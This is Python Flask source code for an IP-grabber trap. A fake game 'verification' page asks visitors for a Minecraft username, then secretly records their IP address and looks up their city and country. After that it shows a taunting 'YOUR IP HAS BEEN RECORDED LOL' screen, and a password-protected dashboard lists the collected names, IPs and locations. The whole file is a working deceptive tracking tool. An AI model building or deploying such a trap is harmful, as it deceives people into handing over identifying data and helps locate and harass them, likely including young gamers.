from flask import Flask, request, render_template_string, session, redirect, url_for
import datetime
import os
import requests

app = Flask(__name__)
app.secret_key = "A6a4LaI0CSSESDKXMssV"

# --- CONFIG ---
ADMIN_PASSWORD = "your-password"
recorded_ips = []

# --- HTML TEMPLATES ---

# Page 1: The "Verification" Trap
VERIFY_HTML = """
<!DOCTYPE html>
<html>
<head><title>Startup</title><style>
    body { background: #1a1a1a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .box { background: #333; padding: 30px; border-radius: 8px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
    input { padding: 10px; width: 200px; border: none; border-radius: 4px; margin-bottom: 10px; }
    button { padding: 10px 20px; background: #555; color: white; border: none; border-radius: 4px; cursor: pointer; }
    button:hover { background: #777; }
</style></head>
<body>
    <div class="box">
        <h2>Lets get started!</h2>
        <p>Enter your username for the game!</p>
        <form method="POST">
            <input type="text" name="mc_name" placeholder="Username" required><br>
            <button type="submit">Verify & Connect</button>
        </form>
    </div>
</body>
</html>
"""

# Page 2: The "Caught" Screen
CAUGHT_HTML = """
<!DOCTYPE html>
<html>
<head><style>
    body { background: #000; color: red; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Arial Black'; text-align: center; }
    h1 { font-size: 5vw; animation: blink 0.8s infinite; }
    @keyframes blink { 50% { opacity: 0; } }
</style></head>
<body><h1>YOUR IP HAS BEEN RECORDED LOL</h1></body>
</html>
"""

# Dashboard remains the same but shows the MC Username
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head><title>Admin</title><style>
    body { font-family: sans-serif; padding: 20px; }
    table { width: 100%; border-collapse: collapse; }
    th, td { padding: 10px; border: 1px solid #ddd; }
    th { background: #333; color: white; }
</style></head>
<body>
    <div style="display: flex; justify-content: space-between;">
        <h1>IP/Username Logs</h1>
        <form action="/clear" method="POST"><button style="background:red; color:white;">CLEAR</button></form>
    </div>
    <table>
        <tr><th>MC Username</th><th>IP</th><th>Location</th><th>Time</th></tr>
        {% for entry in logs %}
        <tr><td><strong>{{ entry.name }}</strong></td><td><code>{{ entry.ip }}</code></td><td>{{ entry.loc }}</td><td>{{ entry.time }}</td></tr>
        {% endfor %}
    </table>
</body>
</html>
"""

# --- HELPERS ---

def get_location(ip):
    try:
        r = requests.get(f"http://ip-api.com{ip}", timeout=2)
        data = r.json()
        return f"{data.get('city')}, {data.get('country')}" if data.get('status') == 'success' else "Unknown"
    except: return "Error"

# --- ROUTES ---

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        # Get username from the form
        username = request.form.get('mc_name', 'Unknown')
        
        # Get IP and Location
        ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
        timestamp = datetime.datetime.now().strftime("%I:%M %p")
        location = get_location(ip_addr)

        # Log it
        recorded_ips.append({
            "name": username,
            "ip": ip_addr,
            "loc": location,
            "time": timestamp
        })
        
        return render_template_string(CAUGHT_HTML)
    
    return render_template_string(VERIFY_HTML)

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['logged_in'] = True
    if not session.get('logged_in'):
        return """<form method="POST">Pass: <input type="password" name="password"><input type="submit"></form>"""
    return render_template_string(DASHBOARD_HTML, logs=recorded_ips[::-1])

@app.route('/clear', methods=['POST'])
def clear_logs():
    if session.get('logged_in'): recorded_ips.clear()
    return redirect(url_for('dashboard'))

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
